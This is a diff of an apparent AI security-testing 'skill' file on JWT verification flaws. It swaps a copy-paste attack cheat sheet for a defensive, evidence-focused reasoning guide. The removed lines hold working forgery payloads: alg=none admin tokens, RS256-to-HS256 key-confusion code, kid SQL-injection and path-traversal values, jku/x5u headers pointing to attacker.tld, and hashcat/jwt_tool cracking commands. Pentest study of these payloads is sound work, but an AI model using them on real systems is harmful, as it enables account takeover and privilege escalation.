@@ -1,94 +1,70 @@
-# SKILL: JWT Attacks (alg=none / weak HS / kid injection / jku / x5u / public→private)
+# JWT Security — verifier and claim-binding reasoning guide
 
-## Version: 1.0 | Domain: web | Trigger: `WEB MODE` + (jwt attacks (alg=none / weak hs / kid injection / jku / x5u / public→private)) or pasted request matching this class
+Use this file when the application relies on JWT/JWS/JWE tokens and evidence suggests the verifier may trust attacker-influenced algorithm, key, header, or claim state incorrectly.
 
----
+## Goal
 
-## IDENTITY IN THIS SKILL
-JWT is everywhere; misimplementation is everywhere. I always test alg manipulation, kid traversal, weak secret, jku/x5u override.
+Determine whether the server accepts a token whose **integrity, key source, issuer/audience, subject, or privilege claims** were not authorized by the intended trust configuration.
 
----
+Do not mechanically try every historical JWT trick against every token.
 
-## DETECTION
-1. Decode token. Note `alg` and `kid`/`jku`/`x5u`.
-2. Test `alg=none`: `{"alg":"none"}.{...}.` (empty signature).
-3. Test HS256→HS512 / RS256→HS256 (signing with public key as HMAC key).
-4. Test `kid` traversal: `{"kid":"../../../../dev/null"}` then sign with empty key.
-5. Test `jku`/`x5u` override: point to attacker.tld JWKS.
-6. Brute weak HS256 secrets with `jwt-cracker` or `hashcat -m 16500`.
+## Map the trust decision
 
-## EXPLOITATION
-### alg=none
-```
-header: {"alg":"none","typ":"JWT"}
-payload: {"sub":"admin","iat":...,"exp":...}
-signature: (empty)
-final: <b64header>.<b64payload>.
-```
+For the token under test, identify:
 
-### RS256 → HS256 (sign with public key as HMAC secret)
-```python
-import jwt
-pub = open('jwks_public.pem').read()
-token = jwt.encode({'sub':'admin'}, pub, algorithm='HS256')
-```
+- token purpose: session, API access, reset, invitation, service-to-service, etc.,
+- issuer and audience expectations,
+- verification algorithm/family,
+- key source and key-selection mechanism,
+- relevant header fields that influence verification/key lookup,
+- subject/account/tenant/role claims consumed by the application,
+- expiry/not-before/issued-at handling,
+- where authorization is derived from token claims vs server-side state.
 
-### kid SQL injection
-```
-kid: 'UNION SELECT 'AAAA'-- 
-# Sign payload with HMAC-SHA256(key='AAAA')
-```
+The useful question is: **which attacker-controlled token fields can influence how the verifier chooses trust material or security state?**
 
-### kid path traversal
-```
-kid: ../../../dev/null
-# Sign with empty key (or known constant if /dev/null served)
-```
+## Minimal hunt loop
 
-### jku override
-```
-jku: https://attacker.tld/jwks.json
-# Host JWKS containing attacker's RSA public key matching attacker's private key
-```
+1. Decode a legitimate token without assuming decoded claims are trusted.
+2. Determine which fields the application actually enforces by changing one non-destructive claim/header assumption at a time.
+3. Compare rejection/acceptance at the protected action, not only token parsing.
+4. Test algorithm/key-source behavior only when the token format/library/deployment suggests that path is relevant.
+5. Verify any accepted forged/altered token by observing the resulting server-side identity or capability.
+6. Falsify benign explanations such as frontend-only decoding, unsigned display tokens, cached sessions, stale cookies, or an endpoint that ignores the tested claim.
 
-### x5u override
-Same as jku but `x5u` (X.509 cert URL).
+## High-signal questions
 
-### Weak secret brute
-```bash
-jwt_tool token -C -d /path/to/wordlist.txt
-hashcat -a 0 -m 16500 token.txt rockyou.txt
-```
+- Is the expected algorithm fixed by server configuration or chosen from attacker-controlled token data?
+- Is key selection constrained to trusted keys/issuers?
+- Can header-controlled key identifiers/URLs change the trust source unexpectedly?
+- Are issuer, audience, tenant, subject, and token-purpose boundaries enforced?
+- Are privilege claims recomputed server-side or trusted directly from the token?
+- Can a token issued for one flow/service/client be replayed in another?
+- Are expiry/revocation/security-event expectations enforced where the product relies on them?
 
-## PAYLOADS (real, copy-paste, grouped)
-(see above)
+## Evidence contract
 
-## BYPASS TECHNIQUES
-Mixing `alg=NONE` (caps), `alg=nOnE`, `alg=`, blank header. JSON duplicate keys: `{"alg":"HS256","alg":"none"}` — depending on parser.
+A strong JWT finding should preserve:
 
-## CHAIN POTENTIAL
-JWT forgery → ATO any user / role escalate.
+1. token purpose and normal trust configuration as observed,
+2. exact attacker-controlled field/assumption,
+3. accepted altered/forged token or equivalent verifier failure,
+4. protected action/data proving the resulting identity/capability,
+5. clean rejection/control case,
+6. strongest benign explanation tested and rejected.
 
-## TOOLS
-jwt_tool, jwt-cracker, hashcat, jwt.io for manual
+Do not assign numeric severity here.
 
-## COMMANDS
-```bash
-jwt_tool eyJhbGciOi... -T              # tamper interactive
-jwt_tool eyJ... -X a                    # alg=none
-jwt_tool eyJ... -X k -pk public.pem     # confused-key (RS→HS)
-jwt_tool eyJ... -X i -I -pc name -pv admin   # kid sqli
-jwt_tool eyJ... -X s -ju https://attacker.tld/jwks.json -pk priv.pem   # jku override
-```
+## Stop conditions
 
-## EDGE CASES / NOT-A-BUG TRAPS
-Modern libs (PyJWT, jose, jsonwebtoken) reject alg=none unless explicitly enabled. Older libs / custom decoders bite.
+Reject or narrow when:
 
-## TRIAGE ANGLE (per platform)
-Show forged token granting admin access in API call.
+- only local/frontend decoding changes,
+- the server rejects the altered token before protected capability is granted,
+- the changed claim is not security-relevant or is ignored server-side,
+- the token is not intended as an integrity-bearing security artifact,
+- the candidate depends on an unverified assumption about the signing key/library.
 
-## SEVERITY & CVSS
-9.0+.
+## References on demand
 
-## REFERENCES
-PortSwigger JWT • jwt_tool README • PayloadsAllTheThings/JSON Web Token
+Exact historical token-manipulation material lives in `payloads/references/8-jwt-exploits.md`. Load only the subset relevant to the observed verifier/key model. Use `auth_bypass_all_types.md` or `api-mode` for the surrounding authentication/authorization boundary, and `account_takeover_chains.md` only after a real capability is demonstrated.
